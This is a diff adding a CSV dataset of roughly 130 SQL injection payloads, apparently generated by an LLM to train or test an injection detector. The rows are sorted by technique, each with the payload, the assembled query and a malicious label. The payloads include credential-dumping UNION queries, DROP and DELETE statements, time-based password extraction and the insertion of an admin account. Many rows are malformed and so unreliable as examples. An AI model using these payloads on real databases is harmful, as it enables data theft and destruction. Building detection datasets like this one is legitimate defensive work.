@@ -1,0 +1,130 @@
+attack_category,template_context,payload,full_query,label,source,generator_model
+tautology,login,' OR 'x'='x',SELECT * FROM users WHERE username = '' OR 'x'='x'' AND password = 'anything',1,llm_generated,gemini-3-flash-preview
+tautology,login,' OR 1=1 --,SELECT * FROM users WHERE username = '' OR 1=1 --' AND password = 'anything',1,llm_generated,gemini-3-flash-preview
+tautology,login,'; DROP TABLE users;--,SELECT * FROM users WHERE username = ''; DROP TABLE users;--' AND password = 'anything',1,llm_generated,gemini-3-flash-preview
+tautology,search,' OR 1=1 --,SELECT * FROM products WHERE name LIKE '%' OR 1=1 --%',1,llm_generated,gemini-3-flash-preview
+tautology,search,; DROP TABLE IF EXISTS users;--,SELECT * FROM products WHERE name LIKE '%; DROP TABLE IF EXISTS users;--%',1,llm_generated,gemini-3-flash-preview
+tautology,search,/*'*/OR 1=1 /*'*/,SELECT * FROM products WHERE name LIKE '%/*'*/OR 1=1 /*'*/%',1,llm_generated,gemini-3-flash-preview
+tautology,user_lookup,1; --,SELECT * FROM users WHERE id = 1; --,1,llm_generated,gemini-3-flash-preview
+tautology,user_lookup,1' AND '1'='1,SELECT * FROM users WHERE id = 1' AND '1'='1,1,llm_generated,gemini-3-flash-preview
+tautology,user_lookup,SELECT * FROM users WHERE id = 1 OR (SELECT 1 FROM (SELECT 1)) --,SELECT * FROM users WHERE id = SELECT * FROM users WHERE id = 1 OR (SELECT 1 FROM (SELECT 1)) --,1,llm_generated,gemini-3-flash-preview
+tautology,order_filter,status = 'pending' OR 1=1 --,SELECT * FROM orders WHERE status = 'status = 'pending' OR 1=1 --' ORDER BY date DESC,1,llm_generated,gemini-3-flash-preview
+tautology,order_filter,status LIKE '%%' OR '1'='1',SELECT * FROM orders WHERE status = 'status LIKE '%%' OR '1'='1'' ORDER BY date DESC,1,llm_generated,gemini-3-flash-preview
+tautology,order_filter,SELECT * FROM orders WHERE status = 'cancelled' OR (SELECT 1 FROM (SELECT 0)),SELECT * FROM orders WHERE status = 'SELECT * FROM orders WHERE status = 'cancelled' OR (SELECT 1 FROM (SELECT 0))' ORDER BY date DESC,1,llm_generated,gemini-3-flash-preview
+tautology,comment_insert,"1 OR ""'""=""'","INSERT INTO comments (user_id, body) VALUES (1, '1 OR ""'""=""'')",1,llm_generated,gemini-3-flash-preview
+tautology,comment_insert,1 OR /* */ 1=1,"INSERT INTO comments (user_id, body) VALUES (1, '1 OR /* */ 1=1')",1,llm_generated,gemini-3-flash-preview
+tautology,comment_insert,1 OR -- 1,"INSERT INTO comments (user_id, body) VALUES (1, '1 OR -- 1')",1,llm_generated,gemini-3-flash-preview
+union_based,login,SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything',SELECT * FROM users WHERE username = 'SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything'' AND password = 'anything',1,llm_generated,gemini-3-flash-preview
+union_based,login,SELECT * FROM users WHERE username = (SELECT username FROM admins LIMIT 1) AND password = '' OR '1'='1',SELECT * FROM users WHERE username = 'SELECT * FROM users WHERE username = (SELECT username FROM admins LIMIT 1) AND password = '' OR '1'='1'' AND password = 'anything',1,llm_generated,gemini-3-flash-preview
+union_based,login,"SELECT * FROM users WHERE username = CHAR(97,100,109,105,'n') COLLATE utf8mb4_general_ci AND password = 'ignore'","SELECT * FROM users WHERE username = 'SELECT * FROM users WHERE username = CHAR(97,100,109,105,'n') COLLATE utf8mb4_general_ci AND password = 'ignore'' AND password = 'anything'",1,llm_generated,gemini-3-flash-preview
+union_based,search,"' OR '1'='1 UNION SELECT username, password FROM users --","SELECT * FROM products WHERE name LIKE '%' OR '1'='1 UNION SELECT username, password FROM users --%'",1,llm_generated,gemini-3-flash-preview
+union_based,search,"` OR `1`=`1 UNION SELECT email, phone FROM customers /*","SELECT * FROM products WHERE name LIKE '%` OR `1`=`1 UNION SELECT email, phone FROM customers /*%'",1,llm_generated,gemini-3-flash-preview
+union_based,search,"'; DROP TABLE IF EXISTS temp; CREATE TABLE temp AS SELECT id, CONCAT(username, ':', password) AS creds FROM users; --","SELECT * FROM products WHERE name LIKE '%'; DROP TABLE IF EXISTS temp; CREATE TABLE temp AS SELECT id, CONCAT(username, ':', password) AS creds FROM users; --%'",1,llm_generated,gemini-3-flash-preview
+union_based,user_lookup,SELECT * FROM users WHERE id = ' OR '1'='1,SELECT * FROM users WHERE id = SELECT * FROM users WHERE id = ' OR '1'='1,1,llm_generated,gemini-3-flash-preview
+union_based,user_lookup,"-- -
+UNION SELECT password FROM users WHERE id = '-- -'","SELECT * FROM users WHERE id = -- -
+UNION SELECT password FROM users WHERE id = '-- -'",1,llm_generated,gemini-3-flash-preview
+union_based,user_lookup,/* comment */ UNION SELECT username FROM users WHERE id = '#comment',SELECT * FROM users WHERE id = /* comment */ UNION SELECT username FROM users WHERE id = '#comment',1,llm_generated,gemini-3-flash-preview
+union_based,order_filter,"UNION SELECT username, password FROM users --""","SELECT * FROM orders WHERE status = 'UNION SELECT username, password FROM users --""' ORDER BY date DESC",1,llm_generated,gemini-3-flash-preview
+union_based,order_filter,"OR 1=1;--""""""","SELECT * FROM orders WHERE status = 'OR 1=1;--""""""' ORDER BY date DESC",1,llm_generated,gemini-3-flash-preview
+union_based,order_filter,; DROP TABLE IF EXISTS temp_table; --,SELECT * FROM orders WHERE status = '; DROP TABLE IF EXISTS temp_table; --' ORDER BY date DESC,1,llm_generated,gemini-3-flash-preview
+union_based,comment_insert,1); --,"INSERT INTO comments (user_id, body) VALUES (1, '1); --')",1,llm_generated,gemini-3-flash-preview
+union_based,comment_insert,"1');/**/UNION/**/SELECT/**/user_id,/**/password/**/FROM/**/users--","INSERT INTO comments (user_id, body) VALUES (1, '1');/**/UNION/**/SELECT/**/user_id,/**/password/**/FROM/**/users--')",1,llm_generated,gemini-3-flash-preview
+union_based,comment_insert,1 OR '1'='1,"INSERT INTO comments (user_id, body) VALUES (1, '1 OR '1'='1')",1,llm_generated,gemini-3-flash-preview
+blind_boolean,login,' OR '1'='1,SELECT * FROM users WHERE username = '' OR '1'='1' AND password = 'anything',1,llm_generated,gemini-3-flash-preview
+blind_boolean,login,'; DROP TABLE IF EXISTS fakeusers; --,SELECT * FROM users WHERE username = ''; DROP TABLE IF EXISTS fakeusers; --' AND password = 'anything',1,llm_generated,gemini-3-flash-preview
+blind_boolean,login,username LIKE '%admin%' AND password LIKE '%admin%,SELECT * FROM users WHERE username = 'username LIKE '%admin%' AND password LIKE '%admin%' AND password = 'anything',1,llm_generated,gemini-3-flash-preview
+blind_boolean,search,"[""%\' AND 1=1 --""","SELECT * FROM products WHERE name LIKE '%[""%\' AND 1=1 --""%'",1,llm_generated,gemini-3-flash-preview
+blind_boolean,search,"\' OR 1=1 /*""","SELECT * FROM products WHERE name LIKE '%\' OR 1=1 /*""%'",1,llm_generated,gemini-3-flash-preview
+blind_boolean,search,"%\') OR 1=0; -- \'""","SELECT * FROM products WHERE name LIKE '%%\') OR 1=0; -- \'""%'",1,llm_generated,gemini-3-flash-preview
+blind_boolean,search,"\' AND (SELECT 1 FROM users WHERE username = 'admin') --""","SELECT * FROM products WHERE name LIKE '%\' AND (SELECT 1 FROM users WHERE username = 'admin') --""%'",1,llm_generated,gemini-3-flash-preview
+blind_boolean,search,"\' OR 1=1 UNION SELECT NULL, NULL, password FROM users --""]","SELECT * FROM products WHERE name LIKE '%\' OR 1=1 UNION SELECT NULL, NULL, password FROM users --""]%'",1,llm_generated,gemini-3-flash-preview
+blind_boolean,user_lookup,(SELECT CASE WHEN (SELECT 1 FROM users WHERE username = 'admin') THEN 1 ELSE 0 END),SELECT * FROM users WHERE id = (SELECT CASE WHEN (SELECT 1 FROM users WHERE username = 'admin') THEN 1 ELSE 0 END),1,llm_generated,gemini-3-flash-preview
+blind_boolean,user_lookup,{--} OR 1=1 {--},SELECT * FROM users WHERE id = {--} OR 1=1 {--},1,llm_generated,gemini-3-flash-preview
+blind_boolean,user_lookup,(CASE WHEN (SELECT password FROM users WHERE id = 1 LIMIT 1) LIKE '%a%' THEN 1 ELSE 0 END),SELECT * FROM users WHERE id = (CASE WHEN (SELECT password FROM users WHERE id = 1 LIMIT 1) LIKE '%a%' THEN 1 ELSE 0 END),1,llm_generated,gemini-3-flash-preview
+blind_boolean,order_filter,' OR 1=1 --,SELECT * FROM orders WHERE status = '' OR 1=1 --' ORDER BY date DESC,1,llm_generated,gemini-3-flash-preview
+blind_boolean,order_filter,' AND '1'='1',SELECT * FROM orders WHERE status = '' AND '1'='1'' ORDER BY date DESC,1,llm_generated,gemini-3-flash-preview
+blind_boolean,order_filter,CASE WHEN 1=1 THEN '1' ELSE '' END,SELECT * FROM orders WHERE status = 'CASE WHEN 1=1 THEN '1' ELSE '' END' ORDER BY date DESC,1,llm_generated,gemini-3-flash-preview
+blind_boolean,comment_insert,' OR 1=1 --,"INSERT INTO comments (user_id, body) VALUES (1, '' OR 1=1 --')",1,llm_generated,gemini-3-flash-preview
+blind_boolean,comment_insert,' AND 1=1 /*,"INSERT INTO comments (user_id, body) VALUES (1, '' AND 1=1 /*')",1,llm_generated,gemini-3-flash-preview
+blind_boolean,comment_insert,'; DROP TABLE users;--,"INSERT INTO comments (user_id, body) VALUES (1, ''; DROP TABLE users;--')",1,llm_generated,gemini-3-flash-preview
+blind_time,login,' OR '1'='1' -- -,SELECT * FROM users WHERE username = '' OR '1'='1' -- -' AND password = 'anything',1,llm_generated,gemini-3-flash-preview
+blind_time,login,' OR SLEEP(5) -- -,SELECT * FROM users WHERE username = '' OR SLEEP(5) -- -' AND password = 'anything',1,llm_generated,gemini-3-flash-preview
+blind_time,login,'; WAITFOR DELAY '00:00:05' -- -,SELECT * FROM users WHERE username = ''; WAITFOR DELAY '00:00:05' -- -' AND password = 'anything',1,llm_generated,gemini-3-flash-preview
+blind_time,search,"' OR '1'='1' AND EXISTS(SELECT 1 FROM users WHERE username LIKE '%' || SUBSTRING(password, 1, 1) || '%' SLEEP(5)) --","SELECT * FROM products WHERE name LIKE '%' OR '1'='1' AND EXISTS(SELECT 1 FROM users WHERE username LIKE '%' || SUBSTRING(password, 1, 1) || '%' SLEEP(5)) --%'",1,llm_generated,gemini-3-flash-preview
+blind_time,search,""" OR ""1""=""1"" AND (SELECT IF(SUBSTRING(password, 1, 1) = 'a', sleep(5), NULL) FROM users)","SELECT * FROM products WHERE name LIKE '%"" OR ""1""=""1"" AND (SELECT IF(SUBSTRING(password, 1, 1) = 'a', sleep(5), NULL) FROM users)%'",1,llm_generated,gemini-3-flash-preview
+blind_time,search,"' OR '1'='1' AND (BENCHMARK(1000000, MD5('')))","SELECT * FROM products WHERE name LIKE '%' OR '1'='1' AND (BENCHMARK(1000000, MD5('')))%'",1,llm_generated,gemini-3-flash-preview
+blind_time,user_lookup,OR 1=1 --,SELECT * FROM users WHERE id = OR 1=1 --,1,llm_generated,gemini-3-flash-preview
+blind_time,user_lookup,AND sleep(2) /*,SELECT * FROM users WHERE id = AND sleep(2) /*,1,llm_generated,gemini-3-flash-preview
+blind_time,user_lookup,OR 1=1; DROP TABLE users --,SELECT * FROM users WHERE id = OR 1=1; DROP TABLE users --,1,llm_generated,gemini-3-flash-preview
+blind_time,order_filter,SELECT * FROM orders WHERE status = 'ACTIVE' AND 1=0 OR 1=1 --' OR SLEEP(5) OR '1'='1,SELECT * FROM orders WHERE status = 'SELECT * FROM orders WHERE status = 'ACTIVE' AND 1=0 OR 1=1 --' OR SLEEP(5) OR '1'='1' ORDER BY date DESC,1,llm_generated,gemini-3-flash-preview
+blind_time,order_filter,SELECT * FROM orders WHERE status = 'PENDING' AND EXTRACT(HOUR FROM NOW()) > 0 /*',SELECT * FROM orders WHERE status = 'SELECT * FROM orders WHERE status = 'PENDING' AND EXTRACT(HOUR FROM NOW()) > 0 /*'' ORDER BY date DESC,1,llm_generated,gemini-3-flash-preview
+blind_time,order_filter,"SELECT * FROM orders WHERE status = 'SHIPPED' AND BENCHMARK(1000000,CRC32(RAND())) --'","SELECT * FROM orders WHERE status = 'SELECT * FROM orders WHERE status = 'SHIPPED' AND BENCHMARK(1000000,CRC32(RAND())) --'' ORDER BY date DESC",1,llm_generated,gemini-3-flash-preview
+blind_time,comment_insert,;/**/SLEEP(5);--,"INSERT INTO comments (user_id, body) VALUES (1, ';/**/SLEEP(5);--')",1,llm_generated,gemini-3-flash-preview
+blind_time,comment_insert,';-- WAITFOR DELAY '00:00:05' --,"INSERT INTO comments (user_id, body) VALUES (1, '';-- WAITFOR DELAY '00:00:05' --')",1,llm_generated,gemini-3-flash-preview
+blind_time,comment_insert,"/*
+TIME_WAIT('5')
+*/;WAITFOR DELAY '00:00:05'--","INSERT INTO comments (user_id, body) VALUES (1, '/*
+TIME_WAIT('5')
+*/;WAITFOR DELAY '00:00:05'--')",1,llm_generated,gemini-3-flash-preview
+stacked_queries,login,; DROP TABLE IF EXISTS users; --,SELECT * FROM users WHERE username = '; DROP TABLE IF EXISTS users; --' AND password = 'anything',1,llm_generated,gemini-3-flash-preview
+stacked_queries,login,"'; CREATE TABLE hackers (id INTEGER PRIMARY KEY, name TEXT); --","SELECT * FROM users WHERE username = ''; CREATE TABLE hackers (id INTEGER PRIMARY KEY, name TEXT); --' AND password = 'anything'",1,llm_generated,gemini-3-flash-preview
+stacked_queries,login,"--; INSERT INTO users (username, password) VALUES ('admin', 'admin');","SELECT * FROM users WHERE username = '--; INSERT INTO users (username, password) VALUES ('admin', 'admin');' AND password = 'anything'",1,llm_generated,gemini-3-flash-preview
+stacked_queries,search,; DROP TABLE users; --,SELECT * FROM products WHERE name LIKE '%; DROP TABLE users; --%',1,llm_generated,gemini-3-flash-preview
+stacked_queries,search,; SELECT * FROM users WHERE username = 'admin' AND password = 'anything'; //,SELECT * FROM products WHERE name LIKE '%; SELECT * FROM users WHERE username = 'admin' AND password = 'anything'; //%',1,llm_generated,gemini-3-flash-preview
+stacked_queries,search,'; DROP DATABASE database_name;--,SELECT * FROM products WHERE name LIKE '%'; DROP DATABASE database_name;--%',1,llm_generated,gemini-3-flash-preview
+stacked_queries,user_lookup,; DROP TABLE users;,SELECT * FROM users WHERE id = ; DROP TABLE users;,1,llm_generated,gemini-3-flash-preview
+stacked_queries,user_lookup,"--
+SELECT id FROM users --","SELECT * FROM users WHERE id = --
+SELECT id FROM users --",1,llm_generated,gemini-3-flash-preview
+stacked_queries,user_lookup,/*malicious*/ ; DELETE FROM users;,SELECT * FROM users WHERE id = /*malicious*/ ; DELETE FROM users;,1,llm_generated,gemini-3-flash-preview
+stacked_queries,order_filter,; DROP TABLE users --,SELECT * FROM orders WHERE status = '; DROP TABLE users --' ORDER BY date DESC,1,llm_generated,gemini-3-flash-preview
+stacked_queries,order_filter,"; DELETE FROM orders;
+--","SELECT * FROM orders WHERE status = '; DELETE FROM orders;
+--' ORDER BY date DESC",1,llm_generated,gemini-3-flash-preview
+stacked_queries,order_filter,--'; INSERT INTO logs VALUES ('hack');--,SELECT * FROM orders WHERE status = '--'; INSERT INTO logs VALUES ('hack');--' ORDER BY date DESC,1,llm_generated,gemini-3-flash-preview
+stacked_queries,comment_insert,SELECT * FROM users; DROP TABLE comments; --,"INSERT INTO comments (user_id, body) VALUES (1, 'SELECT * FROM users; DROP TABLE comments; --')",1,llm_generated,gemini-3-flash-preview
+stacked_queries,comment_insert,--'; DELETE FROM sessions; --,"INSERT INTO comments (user_id, body) VALUES (1, '--'; DELETE FROM sessions; --')",1,llm_generated,gemini-3-flash-preview
+stacked_queries,comment_insert,"/* SQL Injection */; SELECT username, password FROM admin","INSERT INTO comments (user_id, body) VALUES (1, '/* SQL Injection */; SELECT username, password FROM admin')",1,llm_generated,gemini-3-flash-preview
+comment_obfuscation,login,SELECT * FROM users WHERE username = 'admin' /*--*/ AND password = 'admin',SELECT * FROM users WHERE username = 'SELECT * FROM users WHERE username = 'admin' /*--*/ AND password = 'admin'' AND password = 'anything',1,llm_generated,gemini-3-flash-preview
+comment_obfuscation,login,SELECT * FROM users WHERE username = 'admin' #AND password = 'admin',SELECT * FROM users WHERE username = 'SELECT * FROM users WHERE username = 'admin' #AND password = 'admin'' AND password = 'anything',1,llm_generated,gemini-3-flash-preview
+comment_obfuscation,login,SELECT * FROM users WHERE username = 'admin' AND (/*')) */ password = 'admin';,SELECT * FROM users WHERE username = 'SELECT * FROM users WHERE username = 'admin' AND (/*')) */ password = 'admin';' AND password = 'anything',1,llm_generated,gemini-3-flash-preview
+comment_obfuscation,search,/**/SELECT%20*%20FROM%20products%20WHERE%20name%20LIKE%20'%E2%9C%94%E2%9C%94',SELECT * FROM products WHERE name LIKE '%/**/SELECT%20*%20FROM%20products%20WHERE%20name%20LIKE%20'%E2%9C%94%E2%9C%94'%',1,llm_generated,gemini-3-flash-preview
+comment_obfuscation,search,--+SELECT+*+FROM+products+WHERE+name+LIKE+'%%',SELECT * FROM products WHERE name LIKE '%--+SELECT+*+FROM+products+WHERE+name+LIKE+'%%'%',1,llm_generated,gemini-3-flash-preview
+comment_obfuscation,search,#SELECT * FROM products WHERE name LIKE '/*%',SELECT * FROM products WHERE name LIKE '%#SELECT * FROM products WHERE name LIKE '/*%'%',1,llm_generated,gemini-3-flash-preview
+comment_obfuscation,user_lookup,--' OR '1'='1,SELECT * FROM users WHERE id = --' OR '1'='1,1,llm_generated,gemini-3-flash-preview
+comment_obfuscation,user_lookup,/**/1=1,SELECT * FROM users WHERE id = /**/1=1,1,llm_generated,gemini-3-flash-preview
+comment_obfuscation,order_filter,SELECT * FROM orders WHERE status = '/*' OR '1'='1' /*' ORDER BY date DESC,SELECT * FROM orders WHERE status = 'SELECT * FROM orders WHERE status = '/*' OR '1'='1' /*' ORDER BY date DESC' ORDER BY date DESC,1,llm_generated,gemini-3-flash-preview
+comment_obfuscation,order_filter,SELECT * FROM orders WHERE status = '--' OR 1=1 --' ORDER BY date DESC,SELECT * FROM orders WHERE status = 'SELECT * FROM orders WHERE status = '--' OR 1=1 --' ORDER BY date DESC' ORDER BY date DESC,1,llm_generated,gemini-3-flash-preview
+comment_obfuscation,order_filter,SELECT * FROM orders WHERE status = '#' OR 1=1 #' ORDER BY date DESC,SELECT * FROM orders WHERE status = 'SELECT * FROM orders WHERE status = '#' OR 1=1 #' ORDER BY date DESC' ORDER BY date DESC,1,llm_generated,gemini-3-flash-preview
+comment_obfuscation,comment_insert,--' OR '1'='1,"INSERT INTO comments (user_id, body) VALUES (1, '--' OR '1'='1')",1,llm_generated,gemini-3-flash-preview
+comment_obfuscation,comment_insert,#' OR '1'='1,"INSERT INTO comments (user_id, body) VALUES (1, '#' OR '1'='1')",1,llm_generated,gemini-3-flash-preview
+comment_obfuscation,comment_insert,/**/' OR '1'='1,"INSERT INTO comments (user_id, body) VALUES (1, '/**/' OR '1'='1')",1,llm_generated,gemini-3-flash-preview
+encoding_obfuscation,login,%27+OR+1=1;--,SELECT * FROM users WHERE username = '%27+OR+1=1;--' AND password = 'anything',1,llm_generated,gemini-3-flash-preview
+encoding_obfuscation,login,%65%78%61%6D%70%6C%65+%72%65%61%64(%27+OR+1=1;),SELECT * FROM users WHERE username = '%65%78%61%6D%70%6C%65+%72%65%61%64(%27+OR+1=1;)' AND password = 'anything',1,llm_generated,gemini-3-flash-preview
+encoding_obfuscation,login,"UNION+SELECT+NULL,+username+FROM+users+WHERE+1=1","SELECT * FROM users WHERE username = 'UNION+SELECT+NULL,+username+FROM+users+WHERE+1=1' AND password = 'anything'",1,llm_generated,gemini-3-flash-preview
+encoding_obfuscation,search,%25' OR '1'='1,SELECT * FROM products WHERE name LIKE '%%25' OR '1'='1%',1,llm_generated,gemini-3-flash-preview
+encoding_obfuscation,search,"' OR ASCII(SUBSTRING(username,1,1))=116 --","SELECT * FROM products WHERE name LIKE '%' OR ASCII(SUBSTRING(username,1,1))=116 --%'",1,llm_generated,gemini-3-flash-preview
+encoding_obfuscation,user_lookup,%23SELECT+*+FROM+users+WHERE+id+%3D+'admin',SELECT * FROM users WHERE id = %23SELECT+*+FROM+users+WHERE+id+%3D+'admin',1,llm_generated,gemini-3-flash-preview
+encoding_obfuscation,user_lookup,SELECT+*+FROM+users+WHERE+id=CHAR(97)+||+CHAR(98)+||+CHAR(100),SELECT * FROM users WHERE id = SELECT+*+FROM+users+WHERE+id=CHAR(97)+||+CHAR(98)+||+CHAR(100),1,llm_generated,gemini-3-flash-preview
+encoding_obfuscation,user_lookup,/*SELECT*/+*+FRom+usErS+wHeRe+iD+/**/=/**/'a',SELECT * FROM users WHERE id = /*SELECT*/+*+FRom+usErS+wHeRe+iD+/**/=/**/'a',1,llm_generated,gemini-3-flash-preview
+encoding_obfuscation,order_filter,%27--,SELECT * FROM orders WHERE status = '%27--' ORDER BY date DESC,1,llm_generated,gemini-3-flash-preview
+encoding_obfuscation,order_filter,%60;/**/,SELECT * FROM orders WHERE status = '%60;/**/' ORDER BY date DESC,1,llm_generated,gemini-3-flash-preview
+encoding_obfuscation,order_filter,CHAR(39)%0A,SELECT * FROM orders WHERE status = 'CHAR(39)%0A' ORDER BY date DESC,1,llm_generated,gemini-3-flash-preview
+encoding_obfuscation,comment_insert,"%27+UNION+SELECT+NULL,+body+FROM+users--","INSERT INTO comments (user_id, body) VALUES (1, '%27+UNION+SELECT+NULL,+body+FROM+users--')",1,llm_generated,gemini-3-flash-preview
+encoding_obfuscation,comment_insert,"CHAR(45)-*UNION+SELECT+email,+password+FROM+admin/*","INSERT INTO comments (user_id, body) VALUES (1, 'CHAR(45)-*UNION+SELECT+email,+password+FROM+admin/*')",1,llm_generated,gemini-3-flash-preview
+nested_injection,login,SELECT * FROM users WHERE username = '' OR '1'='1',SELECT * FROM users WHERE username = 'SELECT * FROM users WHERE username = '' OR '1'='1'' AND password = 'anything',1,llm_generated,gemini-3-flash-preview
+nested_injection,login,SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything',SELECT * FROM users WHERE username = 'SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything'' AND password = 'anything',1,llm_generated,gemini-3-flash-preview
+nested_injection,login,"SELECT * FROM users WHERE username IN ('admin', (SELECT 'x'))","SELECT * FROM users WHERE username = 'SELECT * FROM users WHERE username IN ('admin', (SELECT 'x'))' AND password = 'anything'",1,llm_generated,gemini-3-flash-preview
+nested_injection,search,;select * from users where username like '%' --,SELECT * FROM products WHERE name LIKE '%;select * from users where username like '%' --%',1,llm_generated,gemini-3-flash-preview
+nested_injection,search,' OR EXISTS(SELECT 1 FROM orders),SELECT * FROM products WHERE name LIKE '%' OR EXISTS(SELECT 1 FROM orders)%',1,llm_generated,gemini-3-flash-preview
+nested_injection,search,'; DROP TABLE IF EXISTS backups;--,SELECT * FROM products WHERE name LIKE '%'; DROP TABLE IF EXISTS backups;--%',1,llm_generated,gemini-3-flash-preview
+nested_injection,user_lookup,(SELECT 1 FROM (SELECT CASE WHEN id=1 THEN 1 ELSE 0 END AS x FROM users)),SELECT * FROM users WHERE id = (SELECT 1 FROM (SELECT CASE WHEN id=1 THEN 1 ELSE 0 END AS x FROM users)),1,llm_generated,gemini-3-flash-preview
+nested_injection,user_lookup,1 AND (SELECT COUNT(*) FROM users WHERE id=2),SELECT * FROM users WHERE id = 1 AND (SELECT COUNT(*) FROM users WHERE id=2),1,llm_generated,gemini-3-flash-preview
+nested_injection,user_lookup,-- OR 'a'='a'; SELECT * FROM users WHERE id=(SELECT MAX(id) FROM users),SELECT * FROM users WHERE id = -- OR 'a'='a'; SELECT * FROM users WHERE id=(SELECT MAX(id) FROM users),1,llm_generated,gemini-3-flash-preview
+nested_injection,order_filter,(SELECT status FROM users WHERE username = 'admin' AND password = 'password'),SELECT * FROM orders WHERE status = '(SELECT status FROM users WHERE username = 'admin' AND password = 'password')' ORDER BY date DESC,1,llm_generated,gemini-3-flash-preview
+nested_injection,order_filter,/* OR (SELECT 1 FROM users WHERE username = 'admin'-- */),SELECT * FROM orders WHERE status = '/* OR (SELECT 1 FROM users WHERE username = 'admin'-- */)' ORDER BY date DESC,1,llm_generated,gemini-3-flash-preview
+nested_injection,order_filter,OR (SELECT * FROM (SELECT * FROM users WHERE username = 'admin') AS temp),SELECT * FROM orders WHERE status = 'OR (SELECT * FROM (SELECT * FROM users WHERE username = 'admin') AS temp)' ORDER BY date DESC,1,llm_generated,gemini-3-flash-preview
+nested_injection,comment_insert,(SELECT body FROM comments WHERE user_id=1)--,"INSERT INTO comments (user_id, body) VALUES (1, '(SELECT body FROM comments WHERE user_id=1)--')",1,llm_generated,gemini-3-flash-preview
+nested_injection,comment_insert,--(SELECT body FROM comments WHERE user_id=1) --,"INSERT INTO comments (user_id, body) VALUES (1, '--(SELECT body FROM comments WHERE user_id=1) --')",1,llm_generated,gemini-3-flash-preview
+nested_injection,comment_insert,;--(SELECT body FROM comments WHERE user_id=1);--,"INSERT INTO comments (user_id, body) VALUES (1, ';--(SELECT body FROM comments WHERE user_id=1);--')",1,llm_generated,gemini-3-flash-preview
